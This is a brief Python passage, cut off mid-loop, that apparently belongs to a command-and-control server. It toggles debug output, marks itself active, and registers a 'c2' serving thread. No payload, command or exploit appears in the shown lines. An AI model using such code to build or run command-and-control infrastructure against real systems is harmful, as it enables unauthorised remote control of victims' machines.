  if globals()['debug']:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
        self._active.set()
        if 'c2' not in globals()['__threads']:
            globals()['__threads']['c2'] = self.serve_until_stopped()
        while True:
            try: